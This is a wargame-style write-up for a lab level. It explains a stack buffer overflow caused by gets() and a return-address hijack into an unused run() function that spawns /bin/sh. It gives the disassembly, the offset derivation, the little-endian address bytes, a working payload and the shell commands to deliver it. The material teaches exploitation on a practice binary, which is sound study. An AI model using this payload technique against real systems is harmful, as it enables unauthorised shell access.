# Way to level2

## Core
`main` reads into a stack buffer with `gets()` and no length check → buffer overflow
(BOF). The binary already contains a never-called `run()` = `system("/bin/sh")` → overwrite
the return address with `run`'s address (ret2func).

## Decisive disass (full: `disas main`, `disas run`)
```
main:
<+6>:  sub  $0x50,%esp         ; 80B frame
<+9>:  lea  0x10(%esp),%eax    ; buf = esp+0x10
<+16>: call gets@plt           ; no length check -> BOF
run (confirmed unused via info functions):
0x08048444 <+0>                ; run entry = jump target
<+53>: call system@plt         ; x/s shows the argument is "/bin/sh"
```

## Exploit
- offset 76 (derivation): of the 80B frame (`sub $0x50`), buf sits at `esp+0x10` → 64B up,
  plus `and $0xfffffff0` alignment padding 8B + saved ebp 4B → `64+8+4 = 76`.
  (source: main+3/+6/+9)
- Value: `run = 0x08048444` (source: `info functions`/`disas run`+0).
  Little-endian → bytes reversed `\x44\x84\x04\x08` — the lowest-addressed byte is the
  address LSB. (this rule is reused in every later level, not re-explained)
- payload: `'a'*76 + '\x44\x84\x04\x08'`
- Delivery: `system` spawns an **interactive** `/bin/sh` → a bare pipe hits EOF and the
  shell dies instantly. `cat`'s `-` appends the terminal stdin to keep the shell alive.
  (referred to later as the "cat - trick")
```bash
python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
cat /tmp/exploit - | ./level1
```

## Diff from previous
level0 only needed the right branch value (the code ran the shell for you). level1
introduces **return-address hijacking** — BOF + offset math + little-endian + the cat -
trick are all introduced here.
